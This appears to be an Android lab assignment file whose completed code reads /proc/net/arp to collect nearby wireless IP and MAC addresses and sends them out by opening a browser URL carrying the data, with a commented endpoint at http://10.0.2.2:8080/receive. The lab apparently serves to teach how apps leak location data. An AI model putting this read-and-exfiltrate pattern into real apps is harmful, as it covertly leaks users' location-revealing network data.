package lbs.lab.maclocation;

import static android.content.Intent.ACTION_VIEW;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.view.menu.MenuBuilder;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.ItemTouchHelper;

import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.RelativeLayout;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Scanner;

// ************************************************************
// ** Read and edit this file *********************************
// ************************************************************

/**
 * Defines the main Activity for this application - its GUI and behaviour.
 * Extends AppCompatActivity to provide visual flair like the bar at top, hovering button at bottom right.
 * Implements YesNoListener to provide data exfiltration (look at ExfiltrateFragment).
 */
public class MainActivity extends AppCompatActivity implements ExfiltrateFragment.YesNoListener {

    // holds items (data recorded)
    // is linked with the GUI through the ItemsAdapter mAdapter
    private ArrayList<Item> mItemsData;
    private ItemsAdapter mAdapter;

    private static final String TAG = MainActivity.class.getCanonicalName();

    // key used to save/restore items when configuration changes (eg. screen rotates)
    private static final String STATE_ITEMS = "STATE_ITEMS";

    // unique codes used when sending items to be recorded, or gotten out of the database
    public static final int GET_ITEMS_ID = 1;
    public static final int SET_ITEMS_ID = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // set up the connection between the list of items, and what is shown on screen

        RecyclerView mRecyclerView = findViewById(R.id.recyclerView);

        mRecyclerView.setLayoutManager(new LinearLayoutManager(this));

        mItemsData = new ArrayList<>();

        mAdapter = new ItemsAdapter(this, mItemsData);
        mRecyclerView.setAdapter(mAdapter);

        // define how individual displayed items should respond to swipes
        // can be deleted, and order switched

        ItemTouchHelper helper = new ItemTouchHelper(new ItemTouchHelper
                .SimpleCallback(ItemTouchHelper.LEFT | ItemTouchHelper.RIGHT |
                ItemTouchHelper.DOWN | ItemTouchHelper.UP, ItemTouchHelper.LEFT |
                ItemTouchHelper.RIGHT) {
            @Override
            public boolean onMove(RecyclerView recyclerView, RecyclerView.ViewHolder viewHolder, RecyclerView.ViewHolder target) {
                int from = viewHolder.getAdapterPosition();
                int to = target.getAdapterPosition();
                Collections.swap(mItemsData, from, to);
                mAdapter.notifyItemMoved(from, to);
                return false;
            }

            @Override
            public void onSwiped(RecyclerView.ViewHolder viewHolder, int direction) {
                mItemsData.remove(viewHolder.getAdapterPosition());
                mAdapter.notifyItemRemoved(viewHolder.getAdapterPosition());
                updateEmptyMessageVisibility();
            }
        });
        helper.attachToRecyclerView(mRecyclerView);

        // restore previous data, if this instance is being re-created (as in when the screen rotates)

        if (savedInstanceState != null) {
            ArrayList<Item> items = savedInstanceState.getParcelableArrayList(STATE_ITEMS);
            mItemsData.addAll(items);
            mAdapter.notifyDataSetChanged();
        }

        updateEmptyMessageVisibility();
    }

    /**
     * Helper function to control whether a prompt is shown on screen,
     * or if the normal list of recordings should be shown.
     */
    private void updateEmptyMessageVisibility() {
        RelativeLayout emptyView = findViewById(R.id.emptyView);
        if (mItemsData.isEmpty()) {
            emptyView.setVisibility(View.VISIBLE);
        } else {
            emptyView.setVisibility(View.INVISIBLE);
        }
    }

    @SuppressLint("RestrictedApi") // bug in support library
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        if (menu instanceof MenuBuilder) {
            MenuBuilder m = (MenuBuilder) menu;
            m.setOptionalIconsVisible(true);
        }
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int i = item.getItemId();
        // different actions will be taken based on what menu item is selected
        if (i == R.id.action_clear) { // clear the list in memory, but not the database
            resetItems();
        } else if (i == R.id.action_load) { // set the list in memory to be the database's content
            Intent loadIntent = new Intent(this, DatabaseActivity.class);
            loadIntent.putExtra(DatabaseActivity.ITEM_ACTION, DatabaseActivity.GET_ITEMS_ACTION);
            loadIntent.setType(DatabaseActivity.TYPE);
            // the spawned Activity will give back a result, which will contain the data we want
            startActivityForResult(loadIntent, GET_ITEMS_ID);
        } else if (i == R.id.action_save) { // save the list in memory to the database
            Intent saveIntent = new Intent(this, DatabaseActivity.class);
            saveIntent.putExtra(DatabaseActivity.ITEM_ACTION, DatabaseActivity.SET_ITEMS_ACTION);
            saveIntent.putExtra(DatabaseActivity.ITEMS_SET, mItemsData);
            saveIntent.setType(DatabaseActivity.TYPE);
            // again, gives back a result
            startActivityForResult(saveIntent, SET_ITEMS_ID);
        } else if (i == R.id.action_exfiltrate) { // try to exfiltrate the data via the browser
            // starts a dialog
            new ExfiltrateFragment().show(getSupportFragmentManager(), TAG);
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // this function gets called whenever a spawned Activity returns a result
        switch (requestCode) {
            // we only care about the requests we have defined
            case GET_ITEMS_ID:
                if (resultCode == RESULT_OK) {
                    // we are able to store/retrieve this data because Item extends Parcelable
                    ArrayList<Item> items = data.getParcelableArrayListExtra(DatabaseActivity.ITEMS_GET);
                    mItemsData.clear();
                    mItemsData.addAll(items);
                    mAdapter.notifyDataSetChanged();
                    updateEmptyMessageVisibility();
                    Toast.makeText(getApplicationContext(), R.string.data_loaded, Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(getApplicationContext(), R.string.data_loaded_fail, Toast.LENGTH_LONG).show();
                }
                break;
            case SET_ITEMS_ID:
                if (resultCode == RESULT_OK) {
                    Toast.makeText(getApplicationContext(), R.string.data_saved, Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(getApplicationContext(), R.string.data_saved_fail, Toast.LENGTH_LONG).show();
                }
                break;
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        // make sure that when the app's configuration changes, no important data is lost
        outState.putParcelableArrayList(STATE_ITEMS, mItemsData);
        super.onSaveInstanceState(outState);
    }

    /**
     * Clears the data in memory.
     */
    private void resetItems() {
        mItemsData.clear();
        // whenever we edit the Item list, we have to call this to update the GUI
        mAdapter.notifyDataSetChanged();
        updateEmptyMessageVisibility();
    }

    /**
     * This is an important part of the application!
     * How we read data from the system.
     * The function is called whenever the '+' button at the bottom right is clicked.
     * @param view - this is the button clicked.
     */
    public void addItem(View view) {
        // TODO
        // -----------------------------
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/net/arp"));
            String line;
            br.readLine();

            while ((line = br.readLine()) != null) {
                String[] parts = line.split("\\s+");
                if (parts.length >= 6) {
                    String ipAddress = parts[0];
                    String hwType    = parts[1];
                    String flags     = parts[2];
                    String macAddress = parts[3];
                    String mask      = parts[4];
                    String deviceInterface = parts[5];

                    Log.d("ARPEntry", "IP: " + ipAddress +
                            ", HW Type: " + hwType +
                            ", Flags: " + flags +
                            ", MAC: " + macAddress +
                            ", Mask: " + mask +
                            ", Interface: " + deviceInterface);

                    // Only entries for wireless interfaces
                    if (deviceInterface.contains("wlan")) {
                        String mac = "MAC: " + macAddress;
                        String ipInfo = "IP: " + ipAddress;
                        Item item = new Item(ipInfo, mac);

                        // No duplicates
                        boolean isDuplicate = false;
                        for (Item i : mItemsData) {
                            if (i.getTitle().equals(ipInfo) && i.getInfo().equals(mac)) {
                                isDuplicate = true;
                                break;
                            }
                        }

                        if (!isDuplicate)
                            mItemsData.add(item);
                    }
                }
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
            // Add error info
            mItemsData.add(new Item("Error reading ARP", e.getMessage()));
        }

        if (mItemsData.isEmpty()) {
            mItemsData.add(new Item("No data found", ""));
        }

        mAdapter.notifyDataSetChanged();
        updateEmptyMessageVisibility();


        /*
        onYes("http://10.0.2.2:8080/receive");
        */
    }

    /**
     * This is also an important part of the application!
     * Defines how we exfiltrate the data.
     * @param url - this is the URL returned by ExfiltrateFragment.
     */
    @Override
    public void onYes(String url) {
        // TODO

        /*
        String serverUrl = "http://10.0.2.2:8080/receive";
         */
        try {
            StringBuilder combinedData = new StringBuilder();
            combinedData.append("\n");
            for (Item item : mItemsData) {
                String data = item.getTitle() + " | " + item.getInfo();
                combinedData.append(data).append("\n");
            }

            String dataToSend = combinedData.toString();
            String encodedData = Uri.encode(dataToSend);
            String fullUrl = url + "?data=" + encodedData;

            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(fullUrl));
            startActivity(intent);

        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Failed to send data", Toast.LENGTH_SHORT).show();
        }
    }

    /**
     * We don't care what happens when the user doesn't proceed in the exfiltration dialog.
     */
    @Override
    public void onNo() {
        return;
    }
}